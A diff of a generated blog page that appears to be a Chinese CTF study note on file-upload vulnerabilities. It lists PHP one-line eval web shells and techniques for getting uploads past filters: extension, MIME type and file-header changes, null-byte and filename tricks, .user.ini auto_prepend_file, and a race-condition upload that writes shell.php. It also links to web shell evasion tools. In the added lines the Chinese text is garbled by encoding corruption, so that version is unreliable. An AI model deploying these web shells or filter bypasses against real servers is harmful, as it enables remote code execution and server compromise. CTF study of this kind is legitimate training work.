@@ -19,22 +19,22 @@
   <meta name="author" content="Hel1um17">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、后门代码1、一句话后门123&lt;?php @eval($_get[&#x27;cmd&#x27;]); ?&gt;&lt;?php @eval($_request[&#x27;cmd&#x27;]);?&gt;&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_post[&#x27;cmd&#x27;]);&lt;&#x2F;script&gt; 注意，在P">
+    <meta name="description" content="һ�����Ŵ���1��һ�仰����123&lt;?php @eval($_get[&#x27;cmd&#x27;]); ?&gt;&lt;?php @eval($_request[&#x27;cmd&#x27;]);?&gt;&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_post[&#x27;cmd&#x27;]);&lt;&#x2F;script&amp;gt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【CTF笔记】文件上传漏洞">
+<meta property="og:title" content="��CTF�ʼǡ��ļ��ϴ�©��">
 <meta property="og:url" content="https://hel1um17.github.io/2025/02/07/%E3%80%90CTF%E7%AC%94%E8%AE%B0%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hel1um17&#39;s Blog">
-<meta property="og:description" content="一、后门代码1、一句话后门123&lt;?php @eval($_get[&#x27;cmd&#x27;]); ?&gt;&lt;?php @eval($_request[&#x27;cmd&#x27;]);?&gt;&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_post[&#x27;cmd&#x27;]);&lt;&#x2F;script&gt; 注意，在P">
+<meta property="og:description" content="һ�����Ŵ���1��һ�仰����123&lt;?php @eval($_get[&#x27;cmd&#x27;]); ?&gt;&lt;?php @eval($_request[&#x27;cmd&#x27;]);?&gt;&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_post[&#x27;cmd&#x27;]);&lt;&#x2F;script&amp;gt">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-02-07T14:06:53.000Z">
-<meta property="article:modified_time" content="2025-02-08T09:47:33.734Z">
+<meta property="article:modified_time" content="2025-02-10T01:13:08.633Z">
 <meta property="article:author" content="Hel1um17">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>【CTF笔记】文件上传漏洞 - Hel1um17&#39;s Blog</title>
+  <title>��CTF�ʼǡ��ļ��ϴ�©�� - Hel1um17&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="【CTF笔记】文件上传漏洞"></span>
+            <span id="subtitle" data-typed-text="��CTF�ʼǡ��ļ��ϴ�©��"></span>
           
         </div>
 
@@ -235,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          746 字
+          225 字
         
       </span>
     
@@ -246,7 +246,7 @@
         
         
         
-          7 分钟
+          2 分钟
         
       </span>
     
@@ -283,41 +283,41 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">【CTF笔记】文件上传漏洞</h1>
+            <h1 id="seo-header">��CTF�ʼǡ��ļ��ϴ�©��</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="一、后门代码"><a href="#一、后门代码" class="headerlink" title="一、后门代码"></a>一、后门代码</h1><h2 id="1、一句话后门"><a href="#1、一句话后门" class="headerlink" title="1、一句话后门"></a>1、一句话后门</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_get</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_request</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-<p>注意，在PHP中配置 <strong>short_open_tag&#x3D;on</strong> 时，图片中不能含有 <strong>&lt;?</strong> ，有会影响PHP代码的解析，导致图片马解析错误</p>
-<h2 id="2、其他后门代码"><a href="#2、其他后门代码" class="headerlink" title="2、其他后门代码"></a>2、其他后门代码</h2><p>后门代码变形：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/476338641">WebShell变形</a><br>哥斯拉WebShell免杀：<a target="_blank" rel="noopener" href="https://github.com/Tas9er/ByPassGodzilla/">Github链接</a></p>
-<p>注： <strong>assert()</strong> 函数在高版本好像不能直接用，详见：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">PHP手册</a></p>
-<p>二次渲染生成图片马（如upload-labs16关）见：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/2337">二次渲染</a></p>
-<h1 id="二、WAF绕过"><a href="#二、WAF绕过" class="headerlink" title="二、WAF绕过"></a>二、WAF绕过</h1><h2 id="1、允许的后缀名测试"><a href="#1、允许的后缀名测试" class="headerlink" title="1、允许的后缀名测试"></a>1、允许的后缀名测试</h2><p>使用 <strong>BurpSuite</strong> 中的 <strong>Intruder</strong> 爆破可行的后缀名，包括大小写等</p>
-<p>字典见：<a target="_blank" rel="noopener" href="https://github.com/Hel1um17/FuzzDictionary">字典</a></p>
-<h2 id="2、更改数据包内容"><a href="#2、更改数据包内容" class="headerlink" title="2、更改数据包内容"></a>2、更改数据包内容</h2><h3 id="a、Content-Type"><a href="#a、Content-Type" class="headerlink" title="a、Content-Type"></a>a、Content-Type</h3><p>更改Content-Type为图片等，常见的见：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-cn/docs/web/http/mime_types/common_types">MIME类型</a></p>
-<h3 id="b、文件头"><a href="#b、文件头" class="headerlink" title="b、文件头"></a>b、文件头</h3><p>更改文件头实现绕过，常用的文件头见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuluoxingkong/p/10675521.html">文件头</a></p>
-<h3 id="c、加入特殊字符"><a href="#c、加入特殊字符" class="headerlink" title="c、加入特殊字符"></a>c、加入特殊字符</h3><p>如：</p>
-<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang">空格<br>.<br>::<span class="hljs-string">$d</span>ata<br>//注意，以下两个的区别为get方式会自动解码，而post不会，所以需要自己编码后再发送<br><span class="hljs-comment">%00</span><br><span class="hljs-number">0</span>x00<br><span class="hljs-number">0</span>x0a<br></code></pre></td></tr></table></figure>
-<p>注意，可以使用双写某些字符实现对单次过滤的绕过</p>
-<h3 id="d、更改保存路径"><a href="#d、更改保存路径" class="headerlink" title="d、更改保存路径"></a>d、更改保存路径</h3><p>当可以更改保存名称时，可以更改保存名称为 <strong>WebShell.php&#x2F;.</strong></p>
-<p>当通过数组截取后缀名来判断时，可以使用</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">save_name<span class="hljs-selector-attr">[0]</span>=WebShell.php/<br><span class="hljs-comment">//具体索引由代码审计中来</span><br>save_name<span class="hljs-selector-attr">[2]</span>=png<br></code></pre></td></tr></table></figure>
-<p>原理见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xingzhuz/p/18628659">upload-labs21</a></p>
-<h3 id="e、其他"><a href="#e、其他" class="headerlink" title="e、其他"></a>e、其他</h3><p>其他中的方法来自小迪师傅，因脑洞太大此处不好描述，</p>
-<p>视频见：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23">小迪安全</a></p>
-<p>在数据包中增加垃圾数据，在数据包大小超过某一限制时，从而直接放行</p>
-<p>在数据包文件名处更改**filename&#x3D;”WebShell.php”**的形式为：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">filename</span>=x.php<br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;x.php</span><br><span class="hljs-string">filename=&#x27;x.php</span><br><span class="hljs-string">filename=&quot;</span>a.jpg<span class="hljs-comment">;.php&quot;;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;x.php%00.jpg&quot;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;Content-Disposition: form-data;name=&quot;</span>upload_file<span class="hljs-string">&quot;;x.php</span><br><span class="hljs-string">//先看以哪个为准，之后在为准的那个改为php后缀</span><br><span class="hljs-string">filename=&quot;</span>a.jpg<span class="hljs-string">&quot;;filename=&quot;</span>b.jpg<span class="hljs-string">&quot;;filename=&quot;</span>c.jpg<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
-<h2 id="3、上传某些配置文件"><a href="#3、上传某些配置文件" class="headerlink" title="3、上传某些配置文件"></a>3、上传某些配置文件</h2><h3 id="a、上传Apache下的-htaccess-文件"><a href="#a、上传Apache下的-htaccess-文件" class="headerlink" title="a、上传Apache下的 .htaccess 文件"></a>a、上传Apache下的 .htaccess 文件</h3><p>上传 <strong>.htaccess</strong> 实现让PHP解析WebShell.png为php文件等操作</p>
-<p><strong>.htaccess</strong> 的内容我就不放了，百度即可（其实我试了半天愣是不行 &#x2F;_ \ ）</p>
-<h3 id="b、-user-ini"><a href="#b、-user-ini" class="headerlink" title="b、.user.ini"></a>b、.user.ini</h3><p>上传 <strong>.user.ini</strong> 文件，其中配置</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//在前面插入WebShell.png</span><br><span class="hljs-built_in">auto</span>_prepend_file=WebShell.png<br><span class="hljs-comment">//在后面插入WebShell.png</span><br><span class="hljs-built_in">auto</span>_append_file=WebShell.png<br></code></pre></td></tr></table></figure>
-<p>实现对此目录下的PHP文件，插入到正常PHP文件中并以PHP解析WebShell.png</p>
-<h2 id="4、其他方法"><a href="#4、其他方法" class="headerlink" title="4、其他方法"></a>4、其他方法</h2><h3 id="a、条件竞争"><a href="#a、条件竞争" class="headerlink" title="a、条件竞争"></a>a、条件竞争</h3><p>适用于先上传再判断合规与否的情况<br>一个 <strong>Intruder</strong> 负责发包，使文件上传，另一个 <strong>Intruder</strong> 负责访问，负责访问PHP代码，使其执行将WebShell写到目录中</p>
+                <h1 id="һ�����W���"><a href="#һ�����W���" class="headerlink" title="һ�����Ŵ���"></a>һ�����Ŵ���</h1><h2 id="1��һ�仰����"><a href="#1��һ�仰����" class="headerlink" title="1��һ�仰����"></a>1��һ�仰����</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_get</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_request</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>ע�⣬��PHP������ <strong>short_open_tag&#x3D;on</strong> ʱ��ͼƬ�в��ܺ��� <strong>&lt;?</strong> ���л�Ӱ��PHP����Ľ���������ͼƬ����������</p>
+<h2 id="2���������W���"><a href="#2���������W���" class="headerlink" title="2���������Ŵ���"></a>2���������Ŵ���</h2><p>���Ŵ�����Σ�<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/476338641">WebShell����</a><br>��˹��WebShell��ɱ��<a target="_blank" rel="noopener" href="https://github.com/Tas9er/ByPassGodzilla/">Github����</a></p>
+<p>ע�� <strong>assert()</strong> �����ڸ߰汾������ֱ���ã������<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">PHP�ֲ�</a></p>
+<p>������Ⱦ����ͼƬ������upload-labs16�أ�����<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/2337">������Ⱦ</a></p>
+<h1 id="����WAF�ƹ�"><a href="#����WAF�ƹ�" class="headerlink" title="����WAF�ƹ�"></a>����WAF�ƹ�</h1><h2 id="1�������l�׺������"><a href="#1�������l�׺������" class="headerlink" title="1�������ĺ�׺������"></a>1�������ĺ�׺������</h2><p>ʹ�� <strong>BurpSuite</strong> �е� <strong>Intruder</strong> ���ƿ��еĺ�׺����������Сд��</p>
+<p>�ֵ����<a target="_blank" rel="noopener" href="https://github.com/Hel1um17/FuzzDictionary">�ֵ�</a></p>
+<h2 id="2���������ݰ�����"><a href="#2���������ݰ�����" class="headerlink" title="2���������ݰ�����"></a>2���������ݰ�����</h2><h3 id="a��Content-Type"><a href="#a��Content-Type" class="headerlink" title="a��Content-Type"></a>a��Content-Type</h3><p>����Content-TypeΪͼƬ�ȣ������ļ���<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-cn/docs/web/http/mime_types/common_types">MIME����</a></p>
+<h3 id="b���l�ͷ"><a href="#b���l�ͷ" class="headerlink" title="b���ļ�ͷ"></a>b���ļ�ͷ</h3><p>�����ļ�ͷʵ���ƹ������õ��ļ�ͷ����<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuluoxingkong/p/10675521.html">�ļ�ͷ</a></p>
+<h3 id="c�����������ַ�"><a href="#c�����������ַ�" class="headerlink" title="c�����������ַ�"></a>c�����������ַ�</h3><p>�磺</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang">�ո�<br>.<br>::<span class="hljs-string">$d</span>ata<br>//ע�⣬��������������Ϊget��ʽ���Զ����룬��post���ᣬ������Ҫ�Լ�������ٷ���<br><span class="hljs-comment">%00</span><br><span class="hljs-number">0</span>x00<br><span class="hljs-number">0</span>x0a<br></code></pre></td></tr></table></figure>
+<p>ע�⣬����ʹ��˫дĳЩ�ַ�ʵ�ֶԵ��ι��˵��ƹ�</p>
+<h3 id="d�����i���·��"><a href="#d�����i���·��" class="headerlink" title="d�����ı���·��"></a>d�����ı���·��</h3><p>�����Ը��ı�������ʱ�����Ը��ı�������Ϊ <strong>WebShell.php&#x2F;.</strong></p>
+<p>��ͨ�������ȡ��׺�����ж�ʱ������ʹ��</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">save_name<span class="hljs-selector-attr">[0]</span>=WebShell.php/<br><span class="hljs-comment">//���������ɴ����������</span><br>save_name<span class="hljs-selector-attr">[2]</span>=png<br></code></pre></td></tr></table></figure>
+<p>ԭ������<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xingzhuz/p/18628659">upload-labs21</a></p>
+<h3 id="e������"><a href="#e������" class="headerlink" title="e������"></a>e������</h3><p>�����еķ�������С��ʦ�������Զ�̫��˴�����������</p>
+<p>��Ƶ����<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23">С�ϰ�ȫ</a></p>
+<p>�����ݰ��������������ݣ������ݰ���С����ĳһ����ʱ���Ӷ�ֱ�ӷ���</p>
+<p>�����ݰ��ļ���������<strong>filename&#x3D;”WebShell.php”</strong>����ʽΪ��</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">filename</span>=x.php<br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;x.php</span><br><span class="hljs-string">filename=&#x27;x.php</span><br><span class="hljs-string">filename=&quot;</span>a.jpg<span class="hljs-comment">;.php&quot;;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;x.php%00.jpg&quot;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;Content-Disposition: form-data;name=&quot;</span>upload_file<span class="hljs-string">&quot;;x.php</span><br><span class="hljs-string">//�ȿ����ĸ�Ϊ׼��֮����Ϊ׼���Ǹ���Ϊphp��׺</span><br><span class="hljs-string">filename=&quot;</span>a.jpg<span class="hljs-string">&quot;;filename=&quot;</span>b.jpg<span class="hljs-string">&quot;;filename=&quot;</span>c.jpg<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+<h2 id="3���ϴ�ĳЩ�����l�"><a href="#3���ϴ�ĳЩ�����l�" class="headerlink" title="3���ϴ�ĳЩ�����ļ�"></a>3���ϴ�ĳЩ�����ļ�</h2><h3 id="a���ϴ�Apache�µ�-htaccess-�l�"><a href="#a���ϴ�Apache�µ�-htaccess-�l�" class="headerlink" title="a���ϴ�Apache�µ� .htaccess �ļ�"></a>a���ϴ�Apache�µ� .htaccess �ļ�</h3><p>�ϴ� <strong>.htaccess</strong> ʵ����PHP����WebShell.pngΪphp�ļ��Ȳ���</p>
+<p><strong>.htaccess</strong> �������ҾͲ����ˣ��ٶȼ��ɣ���ʵ�����˰�����ǲ��� &#x2F;_ \ ��</p>
+<h3 id="b��-user-ini"><a href="#b��-user-ini" class="headerlink" title="b��.user.ini"></a>b��.user.ini</h3><p>�ϴ� <strong>.user.ini</strong> �ļ�����������</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//��ǰ�����WebShell.png</span><br><span class="hljs-built_in">auto</span>_prepend_file=WebShell.png<br><span class="hljs-comment">//�ں������WebShell.png</span><br><span class="hljs-built_in">auto</span>_append_file=WebShell.png<br></code></pre></td></tr></table></figure>
+<p>ʵ�ֶԴ�Ŀ¼�µ�PHP�ļ������뵽����PHP�ļ��в���PHP����WebShell.png</p>
+<h2 id="4����������"><a href="#4����������" class="headerlink" title="4����������"></a>4����������</h2><h3 id="a����������"><a href="#a����������" class="headerlink" title="a����������"></a>a����������</h3><p>���������ϴ����жϺϹ��������<br>һ�� <strong>Intruder</strong> ���𷢰���ʹ�ļ��ϴ�����һ�� <strong>Intruder</strong> ������ʣ��������PHP���룬ʹ��ִ�н�WebShellд��Ŀ¼��</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<h3 id="b、常见中间件解析漏洞"><a href="#b、常见中间件解析漏洞" class="headerlink" title="b、常见中间件解析漏洞"></a>b、常见中间件解析漏洞</h3><p>Apache换行解析漏洞等，详见：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/?id=141">PDF资料</a></p>
-<h3 id="c、文件包含漏洞"><a href="#c、文件包含漏洞" class="headerlink" title="c、文件包含漏洞"></a>c、文件包含漏洞</h3><p>配合文件包含漏洞，解析图片马</p>
+<h3 id="b�������м������©��"><a href="#b�������м������©��" class="headerlink" title="b�������м������©��"></a>b�������м������©��</h3><p>Apache���н���©���ȣ������<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/?id=141">PDF����</a></p>
+<h3 id="c���l�����©��"><a href="#c���l�����©��" class="headerlink" title="c���ļ�����©��"></a>c���ļ�����©��</h3><p>����ļ�����©��������ͼƬ��</p>
 
                 
               </div>
@@ -363,7 +363,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>【CTF笔记】文件上传漏洞</div>
+      <div>��CTF�ʼǡ��ļ��ϴ�©��</div>
       <div>https://hel1um17.github.io/2025/02/07/【CTF笔记】文件上传漏洞/</div>
     </div>
     <div class="license-meta">
@@ -412,8 +412,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/05/%E3%80%90%E5%9B%BE%E7%89%87%E9%A9%AC%E7%9A%84%E8%B8%A9%E5%9D%91%E3%80%91PHP%E6%8A%A5%E9%94%99Unexpected-character-in-input%E7%9A%84%E8%A7%A3%E5%86%B3/" title="【图片马的踩坑】PHP报错Unexpected character in input的解决">
-                        <span class="hidden-mobile">【图片马的踩坑】PHP报错Unexpected character in input的解决</span>
+                      <a href="/2025/02/05/%E3%80%90%E5%9B%BE%E7%89%87%E9%A9%AC%E7%9A%84%E8%B8%A9%E5%9D%91%E3%80%91PHP%E6%8A%A5%E9%94%99Unexpected-character-in-input%E7%9A%84%E8%A7%A3%E5%86%B3/" title="��ͼƬ���Ĳȿӡ�PHP����Unexpected character in input�Ľ��">
+                        <span class="hidden-mobile">��ͼƬ���Ĳȿӡ�PHP����Unexpected character in input�Ľ��</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
